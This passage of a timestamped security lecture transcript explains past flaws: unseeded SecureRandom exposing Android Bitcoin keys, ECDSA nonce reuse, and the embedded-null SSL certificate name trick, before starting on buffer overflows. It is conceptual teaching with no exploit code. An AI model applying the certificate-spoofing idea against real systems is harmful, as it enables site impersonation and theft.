              <text_slice>is that your balance
of Bitcoins is</text_slice>
            </slice>
            <slice>
              <time_slice>36:58</time_slice>
              <text_slice>associated with a private key.</text_slice>
            </slice>
            <slice>
              <time_slice>37:00</time_slice>
              <text_slice>And if you have
someone's private key</text_slice>
            </slice>
            <slice>
              <time_slice>37:03</time_slice>
              <text_slice>you can, of course,
spend their Bitcoins.</text_slice>
            </slice>
            <slice>
              <time_slice>37:05</time_slice>
              <text_slice>So the security of Bitcoin
relies quite heavily</text_slice>
            </slice>
            <slice>
              <time_slice>37:10</time_slice>
              <text_slice>on no one else knowing
your private key.</text_slice>
            </slice>
            <slice>
              <time_slice>37:13</time_slice>
              <text_slice>It's kind of like a password,
except it's even more</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>important, because people can
probably make lots of guesses</text_slice>
            </slice>
            <slice>
              <time_slice>37:18</time_slice>
              <text_slice>at your private key.</text_slice>
            </slice>
            <slice>
              <time_slice>37:19</time_slice>
              <text_slice>And there's no real server
that's checking your key.</text_slice>
            </slice>
            <slice>
              <time_slice>37:21</time_slice>
              <text_slice>It's just cryptography.</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>So any machine can try
to make lots of guesses</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>at your private key.</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>And if they guess it, then
they can transfer your Bitcoins</text_slice>
            </slice>
            <slice>
              <time_slice>37:28</time_slice>
              <text_slice>to someone else.</text_slice>
            </slice>
            <slice>
              <time_slice>37:30</time_slice>
              <text_slice>And as a result, it's
critically important</text_slice>
            </slice>
            <slice>
              <time_slice>37:32</time_slice>
              <text_slice>that you generate
good, random keys</text_slice>
            </slice>
            <slice>
              <time_slice>37:34</time_slice>
              <text_slice>that no one else can guess.</text_slice>
            </slice>
            <slice>
              <time_slice>37:36</time_slice>
              <text_slice>And there are people
using Bitcoin on Android.</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>And the Android applications
for Bitcoin were getting random</text_slice>
            </slice>
            <slice>
              <time_slice>37:45</time_slice>
              <text_slice>values for these keys using this
Java API called SecureRandom(),</text_slice>
            </slice>
            <slice>
              <time_slice>37:51</time_slice>
              <text_slice>which sounds great, but as
people figured out, well, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>37:56</time_slice>
              <text_slice>So what it is, right, it doesn't
really get real random numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>37:59</time_slice>
              <text_slice>Inside of it, there's
this construction</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>called Pseudorandom
Number Generator,</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>or PRNG that, given
a particular seed</text_slice>
            </slice>
            <slice>
              <time_slice>38:07</time_slice>
              <text_slice>value, like you get
maybe a couple of hundred</text_slice>
            </slice>
            <slice>
              <time_slice>38:09</time_slice>
              <text_slice>bits of randomness and you
shove it into this PRNG,</text_slice>
            </slice>
            <slice>
              <time_slice>38:12</time_slice>
              <text_slice>you can keep asking it for more
randomness and sort of stretch</text_slice>
            </slice>
            <slice>
              <time_slice>38:15</time_slice>
              <text_slice>these random bits into as
many random bits as you want.</text_slice>
            </slice>
            <slice>
              <time_slice>38:19</time_slice>
              <text_slice>So you see them
initially, and then you</text_slice>
            </slice>
            <slice>
              <time_slice>38:22</time_slice>
              <text_slice>can generate as many
random bits as you want.</text_slice>
            </slice>
            <slice>
              <time_slice>38:24</time_slice>
              <text_slice>And for various cryptographic
reasons I won't go into here,</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>it actually works.</text_slice>
            </slice>
            <slice>
              <time_slice>38:27</time_slice>
              <text_slice>If you give it a couple of
hundred really good random bits</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>initially, it's going to
be very hard for anyone</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>to predict what the pseudorandom
values it's generating are.</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>But the problem is
that this Java library</text_slice>
            </slice>
            <slice>
              <time_slice>38:40</time_slice>
              <text_slice>had a small bug in it.</text_slice>
            </slice>
            <slice>
              <time_slice>38:41</time_slice>
              <text_slice>In some set of
circumstances, it forgot</text_slice>
            </slice>
            <slice>
              <time_slice>38:44</time_slice>
              <text_slice>to initialize the
PRNG with a seed,</text_slice>
            </slice>
            <slice>
              <time_slice>38:46</time_slice>
              <text_slice>so it was just all zeros, which
means that everyone could just</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>figure out what your
random numbers were.</text_slice>
            </slice>
            <slice>
              <time_slice>38:51</time_slice>
              <text_slice>If they start with
zeros, they'll</text_slice>
            </slice>
            <slice>
              <time_slice>38:53</time_slice>
              <text_slice>produce the same
random numbers as you,</text_slice>
            </slice>
            <slice>
              <time_slice>38:54</time_slice>
              <text_slice>which means they'll produce
the same private key as you.</text_slice>
            </slice>
            <slice>
              <time_slice>38:57</time_slice>
              <text_slice>So they can just generate
the same private key</text_slice>
            </slice>
            <slice>
              <time_slice>38:59</time_slice>
              <text_slice>and transfer your Bitcoins.</text_slice>
            </slice>
            <slice>
              <time_slice>39:01</time_slice>
              <text_slice>So this is, again, a
small or not small bug,</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>depending on, I
guess, who is asking.</text_slice>
            </slice>
            <slice>
              <time_slice>39:08</time_slice>
              <text_slice>But nonetheless, right?</text_slice>
            </slice>
            <slice>
              <time_slice>39:10</time_slice>
              <text_slice>Another example of small
programming mistakes</text_slice>
            </slice>
            <slice>
              <time_slice>39:12</time_slice>
              <text_slice>leading to pretty
catastrophic results.</text_slice>
            </slice>
            <slice>
              <time_slice>39:14</time_slice>
              <text_slice>Lot's of people got their
Bitcoin balances stolen</text_slice>
            </slice>
            <slice>
              <time_slice>39:17</time_slice>
              <text_slice>because of this weakness.</text_slice>
            </slice>
            <slice>
              <time_slice>39:19</time_slice>
              <text_slice>Of course, the fix is
pretty simple at some level.</text_slice>
            </slice>
            <slice>
              <time_slice>39:21</time_slice>
              <text_slice>You change the
Java implementation</text_slice>
            </slice>
            <slice>
              <time_slice>39:23</time_slice>
              <text_slice>of SecureRandom() to always
seed this PRNG with random input</text_slice>
            </slice>
            <slice>
              <time_slice>39:28</time_slice>
              <text_slice>bits.</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>And then, hopefully,
you're in good shape.</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>But still, that's yet another
example of mechanism failure.</text_slice>
            </slice>
            <slice>
              <time_slice>39:36</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>39:37</time_slice>
              <text_slice>AUDIENCE: Just to be clear,
is this a different attack</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>from the DSA
signature randomness?</text_slice>
            </slice>
            <slice>
              <time_slice>39:42</time_slice>
              <text_slice>PROFESSOR: Well yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>39:42</time_slice>
              <text_slice>So the actual problem
is a little bit more</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>complicated, as
you're hinting at.</text_slice>
            </slice>
            <slice>
              <time_slice>39:46</time_slice>
              <text_slice>The problem is, even
if you didn't generate</text_slice>
            </slice>
            <slice>
              <time_slice>39:48</time_slice>
              <text_slice>your key on the Android
device in the first place,</text_slice>
            </slice>
            <slice>
              <time_slice>39:51</time_slice>
              <text_slice>the particular signature
scheme used by Bitcoin</text_slice>
            </slice>
            <slice>
              <time_slice>39:56</time_slice>
              <text_slice>assumes that every time you
generate a new signature</text_slice>
            </slice>
            <slice>
              <time_slice>39:59</time_slice>
              <text_slice>with that key, you
use a fresh, what's</text_slice>
            </slice>
            <slice>
              <time_slice>40:01</time_slice>
              <text_slice>called a nonce, for
generating that signature.</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>And if you ever generate two
signatures with the same nonce,</text_slice>
            </slice>
            <slice>
              <time_slice>40:07</time_slice>
              <text_slice>then someone can figure
out what your key is.</text_slice>
            </slice>
            <slice>
              <time_slice>40:09</time_slice>
              <text_slice>The story is pretty similar.</text_slice>
            </slice>
            <slice>
              <time_slice>40:10</time_slice>
              <text_slice>But the details are
a little different.</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>So yeah, even if you actually
generated your key somewhere</text_slice>
            </slice>
            <slice>
              <time_slice>40:14</time_slice>
              <text_slice>else and your key was great,
it's just that every time you</text_slice>
            </slice>
            <slice>
              <time_slice>40:16</time_slice>
              <text_slice>generate a signature,
you would--</text_slice>
            </slice>
            <slice>
              <time_slice>40:19</time_slice>
              <text_slice>and you generated two signatures
with exactly the same nonce,</text_slice>
            </slice>
            <slice>
              <time_slice>40:23</time_slice>
              <text_slice>or random value, someone
could apply some clever math</text_slice>
            </slice>
            <slice>
              <time_slice>40:26</time_slice>
              <text_slice>to your signatures and sort
of extract your public key out</text_slice>
            </slice>
            <slice>
              <time_slice>40:30</time_slice>
              <text_slice>of it.</text_slice>
            </slice>
            <slice>
              <time_slice>40:30</time_slice>
              <text_slice>Or private key,
more importantly.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>Other questions about these
problems, examples, et cetera?</text_slice>
            </slice>
            <slice>
              <time_slice>40:40</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>So I guess, one thing I wanted
to point out is that actually,</text_slice>
            </slice>
            <slice>
              <time_slice>40:46</time_slice>
              <text_slice>well, as you're
starting to appreciate,</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>is that in computer security,
almost every detail has</text_slice>
            </slice>
            <slice>
              <time_slice>40:52</time_slice>
              <text_slice>a chance of really mattering.</text_slice>
            </slice>
            <slice>
              <time_slice>40:55</time_slice>
              <text_slice>If you screw up almost something
seemingly inconsequential,</text_slice>
            </slice>
            <slice>
              <time_slice>40:58</time_slice>
              <text_slice>like forgetting to check
something, or this,</text_slice>
            </slice>
            <slice>
              <time_slice>41:00</time_slice>
              <text_slice>or forgetting to
initialize the random seed,</text_slice>
            </slice>
            <slice>
              <time_slice>41:03</time_slice>
              <text_slice>it can have pretty
dramatic consequences</text_slice>
            </slice>
            <slice>
              <time_slice>41:04</time_slice>
              <text_slice>for the overall system.</text_slice>
            </slice>
            <slice>
              <time_slice>41:07</time_slice>
              <text_slice>And you really have to
be very clear about,</text_slice>
            </slice>
            <slice>
              <time_slice>41:09</time_slice>
              <text_slice>what is the specification
of your system?</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>What is it doing?</text_slice>
            </slice>
            <slice>
              <time_slice>41:12</time_slice>
              <text_slice>Exactly what are all
the corner cases?</text_slice>
            </slice>
            <slice>
              <time_slice>41:14</time_slice>
              <text_slice>And a good way to sort of
think of breaking a system</text_slice>
            </slice>
            <slice>
              <time_slice>41:17</time_slice>
              <text_slice>or, conversely, figure out
if your system is secure,</text_slice>
            </slice>
            <slice>
              <time_slice>41:19</time_slice>
              <text_slice>is to really push
all the edge cases,</text_slice>
            </slice>
            <slice>
              <time_slice>41:20</time_slice>
              <text_slice>like what happens if my
input is just large enough?</text_slice>
            </slice>
            <slice>
              <time_slice>41:23</time_slice>
              <text_slice>Or what is the biggest
or the smallest input?</text_slice>
            </slice>
            <slice>
              <time_slice>41:26</time_slice>
              <text_slice>What is the sort
of strangest set</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>of inputs I could
provide to my program</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>and push it in all
these corner cases?</text_slice>
            </slice>
            <slice>
              <time_slice>41:34</time_slice>
              <text_slice>One example of this ambiguity,
sort of a good example</text_slice>
            </slice>
            <slice>
              <time_slice>41:38</time_slice>
              <text_slice>to keep in mind, is how
SSL certificates, again,</text_slice>
            </slice>
            <slice>
              <time_slice>41:44</time_slice>
              <text_slice>encode names into the
certificate itself.</text_slice>
            </slice>
            <slice>
              <time_slice>41:49</time_slice>
              <text_slice>So this is a different
problem than the problem</text_slice>
            </slice>
            <slice>
              <time_slice>41:51</time_slice>
              <text_slice>about the certificate
authorities being trusted.</text_slice>
            </slice>
            <slice>
              <time_slice>41:53</time_slice>
              <text_slice>So these SSL certificates
are just sequences of bytes</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>that a web server sends to you.</text_slice>
            </slice>
            <slice>
              <time_slice>41:59</time_slice>
              <text_slice>And inside of this
SSL certificate</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>is the name of the server
you're connecting to,</text_slice>
            </slice>
            <slice>
              <time_slice>42:04</time_slice>
              <text_slice>so something like Amazon.com.</text_slice>
            </slice>
            <slice>
              <time_slice>42:06</time_slice>
              <text_slice>You know, you can't just
put down those bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>You have to encode it
somehow and specify, well,</text_slice>
            </slice>
            <slice>
              <time_slice>42:09</time_slice>
              <text_slice>it's Amazon.com.</text_slice>
            </slice>
            <slice>
              <time_slice>42:10</time_slice>
              <text_slice>And that's the
end of the string.</text_slice>
            </slice>
            <slice>
              <time_slice>42:12</time_slice>
              <text_slice>So in SSL certificates, they
use a particular encoding scheme</text_slice>
            </slice>
            <slice>
              <time_slice>42:18</time_slice>
              <text_slice>that writes down Amazon.com
by first writing down</text_slice>
            </slice>
            <slice>
              <time_slice>42:24</time_slice>
              <text_slice>the number of bytes
in the string.</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>So you first write down, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>42:27</time_slice>
              <text_slice>Well, I'm going to have a 10
byte string called Amazon.com.</text_slice>
            </slice>
            <slice>
              <time_slice>42:35</time_slice>
              <text_slice>That's actually 10 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:36</time_slice>
              <text_slice>Great.</text_slice>
            </slice>
            <slice>
              <time_slice>42:36</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>42:37</time_slice>
              <text_slice>So this is like-- in the
SSL certificate, somewhere</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>in there, there is this byte
10 followed by 10 bytes saying</text_slice>
            </slice>
            <slice>
              <time_slice>42:44</time_slice>
              <text_slice>what the host name is.</text_slice>
            </slice>
            <slice>
              <time_slice>42:45</time_slice>
              <text_slice>And there's other stuff
afterwards, right, and before.</text_slice>
            </slice>
            <slice>
              <time_slice>42:48</time_slice>
              <text_slice>And when a browser takes
it, well, the browser</text_slice>
            </slice>
            <slice>
              <time_slice>42:50</time_slice>
              <text_slice>is written in C. And the
way C represents strings</text_slice>
            </slice>
            <slice>
              <time_slice>42:54</time_slice>
              <text_slice>is by null terminating them.</text_slice>
            </slice>
            <slice>
              <time_slice>42:56</time_slice>
              <text_slice>So in C, a string doesn't
have a length count.</text_slice>
            </slice>
            <slice>
              <time_slice>42:59</time_slice>
              <text_slice>Instead, it has all the bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>43:01</time_slice>
              <text_slice>And the end of the string
is just the byte zero.</text_slice>
            </slice>
            <slice>
              <time_slice>43:03</time_slice>
              <text_slice>And in C, you write it with
a backslash zero character.</text_slice>
            </slice>
            <slice>
              <time_slice>43:07</time_slice>
              <text_slice>So this is in memory
in your browser.</text_slice>
            </slice>
            <slice>
              <time_slice>43:11</time_slice>
              <text_slice>Somewhere in memory
there's this string</text_slice>
            </slice>
            <slice>
              <time_slice>43:13</time_slice>
              <text_slice>of 11 bytes, now, with
an extra zero at the end.</text_slice>
            </slice>
            <slice>
              <time_slice>43:15</time_slice>
              <text_slice>And when a browser
interprets this string,</text_slice>
            </slice>
            <slice>
              <time_slice>43:17</time_slice>
              <text_slice>it just keeps going until
it sees an end of string</text_slice>
            </slice>
            <slice>
              <time_slice>43:19</time_slice>
              <text_slice>marker, which is a zero byte.</text_slice>
            </slice>
            <slice>
              <time_slice>43:22</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>43:24</time_slice>
              <text_slice>So, what could go wrong?</text_slice>
            </slice>
            <slice>
              <time_slice>43:26</time_slice>
              <text_slice>Any guesses?</text_slice>
            </slice>
            <slice>
              <time_slice>43:28</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>AUDIENCE: You have a zero
in the middle [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>43:31</time_slice>
              <text_slice>PROFESSOR: Yes.</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>This is great.</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>43:33</time_slice>
              <text_slice>So, this is actually a
bit of a discontinuity</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>in terms of how
this guy represents</text_slice>
            </slice>
            <slice>
              <time_slice>43:36</time_slice>
              <text_slice>strings and this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>So suppose that I own
the domain foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>43:41</time_slice>
              <text_slice>So I can get certificates
for anything dot foo dot com.</text_slice>
            </slice>
            <slice>
              <time_slice>43:45</time_slice>
              <text_slice>So what I could do is ask for
a certificate for the name</text_slice>
            </slice>
            <slice>
              <time_slice>43:50</time_slice>
              <text_slice>amazon.com0x.foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>43:57</time_slice>
              <text_slice>That's a perfectly valid string.</text_slice>
            </slice>
            <slice>
              <time_slice>43:59</time_slice>
              <text_slice>It has a bunch of bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>44:00</time_slice>
              <text_slice>I guess it's 10, 11
12 13, 14, 15, 16,</text_slice>
            </slice>
            <slice>
              <time_slice>44:03</time_slice>
              <text_slice>there's another four, 20, right?</text_slice>
            </slice>
            <slice>
              <time_slice>44:05</time_slice>
              <text_slice>So this is 20 byte name
with these 20 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>44:10</time_slice>
              <text_slice>So it used to be that if you
go to a certificate authority,</text_slice>
            </slice>
            <slice>
              <time_slice>44:12</time_slice>
              <text_slice>in many cases, you could
say, hey, I own foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>44:15</time_slice>
              <text_slice>Give me a certificate
for this thing.</text_slice>
            </slice>
            <slice>
              <time_slice>44:16</time_slice>
              <text_slice>And they'd be perfectly
willing to do it because it's</text_slice>
            </slice>
            <slice>
              <time_slice>44:19</time_slice>
              <text_slice>a subdomain of foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>It's all yours.</text_slice>
            </slice>
            <slice>
              <time_slice>44:22</time_slice>
              <text_slice>But then, when a browser
takes this string</text_slice>
            </slice>
            <slice>
              <time_slice>44:25</time_slice>
              <text_slice>and loads it in memory, well,
what it does is the same thing</text_slice>
            </slice>
            <slice>
              <time_slice>44:27</time_slice>
              <text_slice>it did here.</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>It copies the string.</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>amazon.com0x.foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>44:37</time_slice>
              <text_slice>It'll dutifully add the
terminating zero at the end.</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>But then, when the rest
of the browser software</text_slice>
            </slice>
            <slice>
              <time_slice>44:43</time_slice>
              <text_slice>goes and tries to interpret the
string at this memory location,</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>it'll keep going up until it
gets to zero and say, OK well,</text_slice>
            </slice>
            <slice>
              <time_slice>44:50</time_slice>
              <text_slice>that's the end of the string.</text_slice>
            </slice>
            <slice>
              <time_slice>44:51</time_slice>
              <text_slice>So this is Amazon.com.</text_slice>
            </slice>
            <slice>
              <time_slice>44:53</time_slice>
              <text_slice>That's it.</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>So this sort of disconnect
between how C software</text_slice>
            </slice>
            <slice>
              <time_slice>45:00</time_slice>
              <text_slice>and how SSL certificates
represent names</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>led to some unfortunate
security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>This was actually
discovered a number of years</text_slice>
            </slice>
            <slice>
              <time_slice>45:08</time_slice>
              <text_slice>ago now by this guy,
Moxie Marlinspike.</text_slice>
            </slice>
            <slice>
              <time_slice>45:11</time_slice>
              <text_slice>But it's a fairly
clever observation.</text_slice>
            </slice>
            <slice>
              <time_slice>45:13</time_slice>
              <text_slice>And these kinds of encoding
bugs are actually also</text_slice>
            </slice>
            <slice>
              <time_slice>45:17</time_slice>
              <text_slice>pretty common in
lots of software</text_slice>
            </slice>
            <slice>
              <time_slice>45:20</time_slice>
              <text_slice>because, unless you're very
diligent about exactly how you</text_slice>
            </slice>
            <slice>
              <time_slice>45:24</time_slice>
              <text_slice>encode things, there might be
different ways of encoding.</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>And whenever there's
disagreement,</text_slice>
            </slice>
            <slice>
              <time_slice>45:28</time_slice>
              <text_slice>there's a chance the bad guy
can take advantage of this.</text_slice>
            </slice>
            <slice>
              <time_slice>45:30</time_slice>
              <text_slice>One system thinks
that's a fine name.</text_slice>
            </slice>
            <slice>
              <time_slice>45:32</time_slice>
              <text_slice>Another thinks that's
not, something else.</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>So these are good places
to sort of push a system</text_slice>
            </slice>
            <slice>
              <time_slice>45:36</time_slice>
              <text_slice>to see how it might break.</text_slice>
            </slice>
            <slice>
              <time_slice>45:39</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>45:42</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>45:42</time_slice>
              <text_slice>So maybe the last example
of mechanism failure</text_slice>
            </slice>
            <slice>
              <time_slice>45:47</time_slice>
              <text_slice>I'm going to talk about today
is a reasonably popular one.</text_slice>
            </slice>
            <slice>
              <time_slice>45:51</time_slice>
              <text_slice>It's this problem
or buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>45:56</time_slice>
              <text_slice>So some of you have seen this
in, or at least at some level,</text_slice>
            </slice>
            <slice>
              <time_slice>45:59</time_slice>
              <text_slice>in 6.033, if you did
the undergrad course.</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>But for those of you that have
forgotten or haven't taken</text_slice>
            </slice>
            <slice>
              <time_slice>46:05</time_slice>
              <text_slice>oh three three, we'll sort
of go over buffer overflows</text_slice>
            </slice>
            <slice>
              <time_slice>46:07</time_slice>
              <text_slice>in more detail.</text_slice>
            </slice>
            <slice>
              <time_slice>46:08</time_slice>
              <text_slice>And this will be, actually,
quite critical for you guys,</text_slice>
            </slice>
            <slice>
              <time_slice>46:10</time_slice>
              <text_slice>because lab one is all
about buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>And you're going
to be exploiting</text_slice>
            </slice>
            <slice>
              <time_slice>46:14</time_slice>
              <text_slice>these vulnerabilities in a
somewhat real web server.</text_slice>
            </slice>
            <slice>
              <time_slice>46:19</time_slice>
              <text_slice>So let's figure out,
what is the setting?</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>What are we talking about here?</text_slice>
            </slice>
            <slice>
              <time_slice>46:23</time_slice>
              <text_slice>So the setting we're
going to be considering</text_slice>
            </slice>
            <slice>
              <time_slice>46:25</time_slice>
              <text_slice>is a system which has,
let's say, a web server.</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>So what we have is, we have
some computer out there</text_slice>
            </slice>
            <slice>
              <time_slice>46:34</time_slice>
              <text_slice>that has a web server on it.</text_slice>
            </slice>
            <slice>
              <time_slice>46:39</time_slice>
              <text_slice>And the web server
is a program that</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>is going to accept connections
from the outside world,</text_slice>
            </slice>
            <slice>
              <time_slice>46:44</time_slice>
              <text_slice>take requests-- which are
basically just packets--</text_slice>
            </slice>
            <slice>
              <time_slice>46:47</time_slice>
              <text_slice>and somehow process them, and
do some checking, probably.</text_slice>
            </slice>
            <slice>
              <time_slice>46:51</time_slice>
              <text_slice>If it's an illegal
URL or if they're</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>trying to access a file they
are not authorized to access,</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>the web server is going
to return an error.</text_slice>
            </slice>
            <slice>
              <time_slice>46:58</time_slice>
              <text_slice>But otherwise, it's going
to access some files,</text_slice>
            </slice>
            <slice>
              <time_slice>47:00</time_slice>
              <text_slice>maybe on disk, and
send them back out</text_slice>
            </slice>
            <slice>
              <time_slice>47:04</time_slice>
              <text_slice>in some sort of a reply.</text_slice>
            </slice>
            <slice>
              <time_slice>47:06</time_slice>
              <text_slice>So this is a hugely common
picture, almost any system</text_slice>
            </slice>
            <slice>
              <time_slice>47:10</time_slice>
              <text_slice>you look at.</text_slice>
            </slice>
            <slice>
              <time_slice>47:11</time_slice>
              <text_slice>What's the policy?</text_slice>
            </slice>
            <slice>
              <time_slice>47:13</time_slice>
              <text_slice>Or what's the threat model?</text_slice>
            </slice>
            <slice>
              <time_slice>47:18</time_slice>
              <text_slice>So this is a bit of a problem
in many real world systems,</text_slice>
            </slice>
            <slice>
              <time_slice>47:22</time_slice>
              <text_slice>namely that it's
actually pretty hard</text_slice>
            </slice>
            <slice>
              <time_slice>47:23</time_slice>
              <text_slice>to pin down what is the
exact policy or threat model</text_slice>
            </slice>
            <slice>
              <time_slice>47:26</time_slice>
              <text_slice>that we're talking about.</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>And this sort of imprecision
or ambiguity about policies,</text_slice>
            </slice>
            <slice>
              <time_slice>47:31</time_slice>
              <text_slice>threat models, et
cetera, is what sometimes</text_slice>
            </slice>
            <slice>
              <time_slice>47:33</time_slice>
              <text_slice>leads to security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>47:34</time_slice>
              <text_slice>Not in this particular
case, but we'll see.</text_slice>
            </slice>
            <slice>
              <time_slice>47:37</time_slice>
              <text_slice>But maybe just to give
you a sense of how</text_slice>
            </slice>
            <slice>
              <time_slice>47:40</time_slice>
              <text_slice>to think of a typical web server
in the context of this policy,</text_slice>
            </slice>
            <slice>
              <time_slice>47:44</time_slice>
              <text_slice>threat model kind of stuff, is
that well, probably the policy</text_slice>
            </slice>
            <slice>
              <time_slice>47:47</time_slice>
              <text_slice>is, the web server should do
what the programmer intended</text_slice>
            </slice>
            <slice>
              <time_slice>47:50</time_slice>
              <text_slice>it to do.</text_slice>
            </slice>
            <slice>
              <time_slice>47:50</time_slice>
              <text_slice>It's a little vague.</text_slice>
            </slice>
            <slice>
              <time_slice>47:51</time_slice>
              <text_slice>But that's probably what's
going on because anything more</text_slice>
            </slice>
            <slice>
              <time_slice>47:53</time_slice>
              <text_slice>specific, as well,
the web server should</text_slice>
            </slice>
            <slice>
              <time_slice>47:55</time_slice>
              <text_slice>do exactly what the
code does, is going</text_slice>
            </slice>
            <slice>
              <time_slice>47:57</time_slice>
              <text_slice>to be a bit of an [INAUDIBLE]
And if your code has a bug,</text_slice>
            </slice>
            <slice>
              <time_slice>47:59</time_slice>
              <text_slice>well, your policy
says, well, that's</text_slice>
            </slice>
            <slice>
              <time_slice>48:01</time_slice>
              <text_slice>exactly what I should do.</text_slice>
            </slice>
            <slice>
              <time_slice>48:02</time_slice>
              <text_slice>I should follow the bug.</text_slice>
            </slice>
            <slice>
              <time_slice>48:04</time_slice>
              <text_slice>So it's a little hard to
state a policy precisely,</text_slice>
            </slice>
            <slice>
              <time_slice>48:07</time_slice>
              <text_slice>but in this case, let's
go with some intuitive</text_slice>
            </slice>
            <slice>
              <time_slice>48:09</time_slice>
              <text_slice>version of, well, the
web server should do what</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>the programmer wanted it to do.</text_slice>
            </slice>
            <slice>
              <time_slice>48:13</time_slice>
              <text_slice>And the threat
model is probably,</text_slice>
            </slice>
            <slice>
              <time_slice>48:15</time_slice>
              <text_slice>the attacker doesn't have
access to this machine,</text_slice>
            </slice>
            <slice>
              <time_slice>48:18</time_slice>
              <text_slice>can't log in to it remotely,
doesn't have physical access</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>to it, but can send
any packet they want.</text_slice>
            </slice>
            <slice>
              <time_slice>48:22</time_slice>
              <text_slice>So they're not restricted
to certain kinds of packets.</text_slice>
            </slice>
            <slice>
              <time_slice>48:26</time_slice>
              <text_slice>Anything you can
shape and sort of</text_slice>
